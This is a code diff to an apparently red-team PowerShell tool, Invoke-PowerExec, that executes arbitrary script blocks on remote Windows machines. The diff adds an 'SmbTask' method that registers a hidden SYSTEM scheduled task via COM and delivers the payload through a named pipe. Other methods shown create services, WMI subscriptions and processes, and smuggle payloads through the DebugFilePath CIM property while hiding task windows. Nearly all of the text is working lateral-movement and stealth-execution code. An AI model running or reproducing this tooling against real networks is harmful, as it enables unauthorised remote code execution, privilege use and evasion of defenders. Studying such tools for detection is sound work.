@@ -80,7 +80,7 @@ Function Invoke-PowerExec {
         [String]
         $Authentication = 'Default',
 
-        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'WinRM')]
+        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'WinRM')]
         [String]
         $Method = 'CimProcess',
 
@@ -99,7 +99,7 @@ Function Invoke-PowerExec {
     if ($PSBoundParameters.ContainsKey('Protocol') -and $Method -notmatch 'Cim.*') {
         Write-Warning "Specified protocol will be ignored with the execution method $Method."
     }
-    if ($PSBoundParameters.ContainsKey('Authentication') -and $Method -eq 'SmbService') {
+    if ($PSBoundParameters.ContainsKey('Authentication') -and $Method -match 'Smb.*') {
         Write-Warning "Specified authentication method will be ignored with the execution method $Method."
     }
 
@@ -416,7 +416,7 @@ Function Local:New-ThreadedFunction {
         $NoImports
     )
 
-    BEGIN {
+    Begin {
         $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
 
         # Force a single-threaded apartment state (for token-impersonation stuffz)
@@ -486,7 +486,7 @@ Function Local:New-ThreadedFunction {
         }
     }
 
-    END {
+    End {
         Write-Verbose "[THREAD] Executing threads"
 
         # Continuously loop through each job queue, consuming output as appropriate
@@ -534,7 +534,7 @@ Function Local:New-PowerExec {
         [String]
         $Authentication = 'Default',
 
-        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'WinRM')]
+        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'WinRM')]
         [String]
         $Method = 'CimProcess',
 
@@ -663,6 +663,14 @@ Function Local:New-PowerExec {
                 }
             }
         }
+        'SmbTask' {
+            try {
+                $output = Invoke-SmbTask -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            }
+            catch [Management.Automation.RuntimeException] {
+                Write-Warning "[$ComputerName] Execution failed. $_"
+            }
+        }
     }
     if ($output) {
         Write-Host "[$ComputerName] Successful execution"
@@ -681,13 +689,13 @@ Function Local:Invoke-CimDelivery {
         $ScriptBlock
     )
 
-    BEGIN {
+    Begin {
         Write-Verbose "[CIMDELIVERY] Getting CIM object"
         $cimObject = Get-CimInstance -Class Win32_OSRecoveryConfiguration -CimSession $CimSession -ErrorAction Stop -Verbose:$false
         $obj = New-Object -TypeName psobject
         $obj | Add-Member -MemberType NoteProperty -Name 'OriginalValue' -Value $cimObject.DebugFilePath
     }
-    PROCESS {
+    Process {
         Write-Verbose "[CIMDELIVERY] Encoding payload into CIM property DebugFilePath"
         $script = ''
         $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
@@ -701,7 +709,7 @@ Function Local:Invoke-CimDelivery {
         $cimObject | Set-CimInstance -Verbose:$false
         $obj | Add-Member -MemberType NoteProperty -Name 'TamperedValue' -Value $cimObject.DebugFilePath
     }
-    END {
+    End {
         $loader = ''
         $loader += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration; '
         $loader += '$y = [char[]][int[]]$x.DebugFilePath.Split('','') -Join ''''; '
@@ -723,12 +731,12 @@ Function Local:Invoke-CimRecovery {
         $DefaultValue = '%SystemRoot%\MEMORY.DMP'
     )
 
-    BEGIN {
+    Begin {
         Write-Verbose "[CIMRECOVERY] Getting CIM object"
         $cimObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
         $computerName = $CimSession.ComputerName
     }
-    PROCESS {
+    Process {
         try {
             Write-Verbose "[CIMRECOVERY] Decoding data from property DebugFilePath"
             $serializedOutput = [char[]][int[]]$cimObject.DebugFilePath.Split(',') -Join ''
@@ -743,7 +751,7 @@ Function Local:Invoke-CimRecovery {
             $cimObject | Set-CimInstance -Verbose:$false
         }
     }
-    END {
+    End {
         return $output
     }
 }
@@ -775,7 +783,7 @@ Function Local:Invoke-CimProcess {
         $Timeout = 3
     )
 
-    BEGIN {
+    Begin {
         try {
             $cimOption = New-CimSessionOption -Protocol $Protocol
             if ($Credential.Username) {
@@ -791,7 +799,7 @@ Function Local:Invoke-CimProcess {
         $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
         $command = 'powershell -NoP -NonI -C "' + $delivery.Loader + '"'
     }
-    PROCESS {
+    Process {
         try {
             Write-Verbose "[CIMEXEC] Running command: $command"    
             $process = Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine=$command} -CimSession $cimSession -Verbose:$false
@@ -803,7 +811,7 @@ Function Local:Invoke-CimProcess {
             Write-Warning "[$ComputerName] Execution failed. $_"
         }
     }
-    END {
+    End {
         Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
         Remove-CimSession -CimSession $cimSession
     }
@@ -836,7 +844,7 @@ Function Local:Invoke-CimTask {
         $Timeout = 3
     )
 
-    BEGIN {
+    Begin {
         try {
             $cimOption = New-CimSessionOption -Protocol $Protocol
             if ($Credential.Username) {
@@ -852,12 +860,12 @@ Function Local:Invoke-CimTask {
         $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
         $argument = '-NoP -NonI -C "' + $delivery.Loader + '"'
     }
-    PROCESS {
+    Process {
         try  {
             $taskParameters = @{
                 TaskName = [guid]::NewGuid().Guid
                 Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell" -Argument $argument
-                Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+                Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
                 Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $cimSession
             }
             Write-Verbose "[CIMEXEC] Registering scheduled task $($taskParameters.TaskName)"
@@ -888,7 +896,7 @@ Function Local:Invoke-CimTask {
             Write-Warning "[$ComputerName] Execution failed. $_"
         }
     }
-    END {
+    End {
         Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
         Remove-CimSession -CimSession $cimSession
     }
@@ -921,7 +929,7 @@ Function Local:Invoke-CimService {
         $Timeout = 3
     )
 
-    BEGIN {
+    Begin {
         try {
             $cimOption = New-CimSessionOption -Protocol $Protocol
             if ($Credential.Username) {
@@ -938,7 +946,7 @@ Function Local:Invoke-CimService {
         $command = '%COMSPEC% /c powershell -NoP -NonI -C "' + $delivery.Loader + '"'
         $serviceName = [guid]::NewGuid().Guid
     }
-    PROCESS {
+    Process {
         try  {
             Write-Verbose "[CIMEXEC] Creating service $serviceName"
             $result = Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{
@@ -973,7 +981,7 @@ Function Local:Invoke-CimService {
             Write-Warning "[$ComputerName] Execution failed. $_"
         }
     }
-    END {
+    End {
         Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
         Remove-CimSession -CimSession $cimSession
     }
@@ -1009,7 +1017,7 @@ Function Local:Invoke-CimSubscription {
         $Sleep = 60
     )
 
-    BEGIN {
+    Begin {
         try {
             $cimOption = New-CimSessionOption -Protocol $Protocol
             if ($Credential.Username) {
@@ -1027,7 +1035,7 @@ Function Local:Invoke-CimSubscription {
         $filterName = [guid]::NewGuid().Guid
         $consumerName = [guid]::NewGuid().Guid
     }
-    PROCESS {
+    Process {
         try  {
             Write-Verbose "[CIMEXEC] Creating event filter $filterName"
             $filterParameters = @{
@@ -1067,7 +1075,7 @@ Function Local:Invoke-CimSubscription {
             Write-Warning "[$ComputerName] Execution failed. $_"
         }
     }
-    END {
+    End {
         Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
         Remove-CimSession -CimSession $cimSession
     }
@@ -1098,7 +1106,7 @@ function Local:Invoke-SmbService {
         $ServiceName = [guid]::NewGuid().Guid
     )
 
-    BEGIN {
+    Begin {
         if ($Credential.UserName) {
             $logonToken = Invoke-UserImpersonation -Credential $Credential
         }
@@ -1140,9 +1148,22 @@ function Local:Invoke-SmbService {
         $loader += '$z = [ScriptBlock]::Create($x); '
         $loader += '& $z'
         $command = '%COMSPEC% /c start %COMSPEC% /c powershell -NoP -NonI -C "' + $loader + '"'
+
+        $script = ''
+        $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
+        $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
+        $script += '$encOutput = [char[]]$output' + [Environment]::NewLine
+        $script += '$writer = [IO.StreamWriter]::new($s)' + [Environment]::NewLine
+        $script += '$writer.AutoFlush = $true' + [Environment]::NewLine
+        $script += '$writer.WriteLine($encOutput)' + [Environment]::NewLine
+        $script += '$writer.Dispose()' + [Environment]::NewLine
+        $script += '$r.Dispose()' + [Environment]::NewLine
+        $script += '$s.Dispose()' + [Environment]::NewLine
+        $script = $script -creplace '(?m)^\s*\r?\n',''
+        $payload = [char[]] $script
     }
 
-    PROCESS {
+    Process {
         Write-Verbose "[SMBEXEC] Opening service manager"
         $managerHandle = $OpenSCManagerA.Invoke("\\$ComputerName", "ServicesActive", 0xF003F)
         if ((-not $managerHandle) -or ($managerHandle -eq 0)) {
@@ -1177,6 +1198,81 @@ function Local:Invoke-SmbService {
             Start-Sleep -Seconds 1
         }
 
+        Write-Verbose "[SMBEXEC] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
+        $pipeTimeout = 10000 # 10s
+        $pipeClient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
+        $pipeClient.Connect($pipeTimeout)
+        Write-Verbose "[SMBEXEC] Delivering payload..."
+        $writer = New-Object IO.StreamWriter($pipeClient)
+        $writer.AutoFlush = $true
+        $writer.WriteLine($payload)
+        Write-Verbose "[SMBEXEC] Getting execution output..."
+        $reader = New-Object IO.StreamReader($pipeClient)
+        $output = ''
+        while (($data = $reader.ReadLine()) -ne $null) {
+            $output += $data + [Environment]::NewLine
+        }
+        Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
+    }
+
+    End {
+        $reader.Dispose()
+        $pipeClient.Dispose()
+
+        Write-Verbose "[SMBEXEC] Deleting the service"
+        if ($DeleteService.invoke($serviceHandle) -eq 0){
+            $err = $GetLastError.Invoke()
+            Write-Warning "[SMBEXEC] DeleteService failed, LastError: $err"
+        }
+        $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
+        $CloseServiceHandle.Invoke($managerHandle) | Out-Null
+
+        if ($logonToken) {
+            Invoke-RevertToSelf -TokenHandle $logonToken
+        }
+    }
+}
+
+function Local:Invoke-SmbTask {
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerName = $env:COMPUTERNAME,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $PipeName = [guid]::NewGuid().Guid,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TaskName = [guid]::NewGuid().Guid
+    )
+
+    Begin {
+        if ($Credential.UserName) {
+            $logonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+
+        $loader = ''
+        $loader += '$s = new-object IO.Pipes.NamedPipeServerStream(''' + $PipeName + ''', 3); '
+        $loader += '$s.WaitForConnection(); '
+        $loader += '$r = new-object IO.StreamReader $s; '
+        $loader += '$x = ''''; '
+        $loader += 'while (($y=$r.ReadLine()) -ne ''''){$x+=$y+[Environment]::NewLine}; '
+        $loader += '$z = [ScriptBlock]::Create($x); '
+        $loader += '& $z'
+        $arguments = '-NoP -NonI -C "' + $loader + '"'
+
         $script = ''
         $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
         $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
@@ -1188,15 +1284,56 @@ function Local:Invoke-SmbService {
         $script += '$r.Dispose()' + [Environment]::NewLine
         $script += '$s.Dispose()' + [Environment]::NewLine
         $script = $script -creplace '(?m)^\s*\r?\n',''
-        $in = [char[]] $script
+        $payload = [char[]] $script
+    }
 
+    Process {
+        try {
+            $com = [Type]::GetTypeFromProgID("Schedule.Service")
+            $scheduleService = [Activator]::CreateInstance($com)
+        }
+        catch {
+            Write-Error "[SMBEXEC] Failed to create COM instance."
+            break
+        }
+
+        try {
+            $scheduleService.Connect($ComputerName)
+        }
+        catch {
+            Write-Error "[SMBEXEC] Unable to access $ComputerName. $_"
+            break
+        }
+        $scheduleTaskFolder = $scheduleService.GetFolder("\")
+        $taskDefinition = $scheduleService.NewTask(0)
+        $taskDefinition.Settings.StopIfGoingOnBatteries = $false
+        $taskDefinition.Settings.DisallowStartIfOnBatteries = $false
+        $taskDefinition.Settings.Hidden = $true
+        $taskDefinition.Principal.RunLevel = 1
+        $taskAction = $taskDefinition.Actions.Create(0)
+        $taskAction.WorkingDirectory = '%windir%\System32\WindowsPowerShell\v1.0\'
+        $taskAction.Path = 'powershell'
+        $taskAction.Arguments = $arguments
+        try {
+            $taskAction.HideAppWindow = $true
+        }
+        catch {}
+        Write-Verbose "[SMBEXEC] Registering scheduled task $TaskName..."
+        $registeredTask = $scheduleTaskFolder.RegisterTaskDefinition($TaskName, $taskDefinition, 6, 'System', $null, 5)
+        Write-Verbose "[SMBEXEC] Running scheduled task..."
+        Write-Debug "powershell $arguments"
+        $scheduledTask = $registeredTask.Run($null)
+
+        Write-Verbose "[SMBEXEC] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
         $pipeTimeout = 10000 # 10s
-        $pipeclient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
-        $pipeclient.Connect($pipeTimeout)
-        $writer = New-Object  IO.StreamWriter($pipeclient)
+        $pipeClient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
+        $pipeClient.Connect($pipeTimeout)
+        Write-Verbose "[SMBEXEC] Delivering payload..."
+        $writer = New-Object IO.StreamWriter($pipeClient)
         $writer.AutoFlush = $true
-        $writer.WriteLine($in)
-        $reader = new-object IO.StreamReader($pipeclient)
+        $writer.WriteLine($payload)
+        Write-Verbose "[SMBEXEC] Getting execution output..."
+        $reader = New-Object IO.StreamReader($pipeClient)
         $output = ''
         while (($data = $reader.ReadLine()) -ne $null) {
             $output += $data + [Environment]::NewLine
@@ -1204,17 +1341,14 @@ function Local:Invoke-SmbService {
         Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
     }
 
-    END {
+    End {
         $reader.Dispose()
-        $pipeclient.Dispose()
+        $pipeClient.Dispose()
 
-        Write-Verbose "[SMBEXEC] Deleting the service"
-        if ($DeleteService.invoke($serviceHandle) -eq 0){
-            $err = $GetLastError.Invoke()
-            Write-Warning "[SMBEXEC] DeleteService failed, LastError: $err"
+        if ($scheduledTask) { 
+            Write-Verbose "[SMBEXEC] Unregistering scheduled task $TaskName..."
+            $scheduleTaskFolder.DeleteTask($scheduledTask.Name, 0) | Out-Null
         }
-        $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
-        $CloseServiceHandle.Invoke($managerHandle) | Out-Null
 
         if ($logonToken) {
             Invoke-RevertToSelf -TokenHandle $logonToken
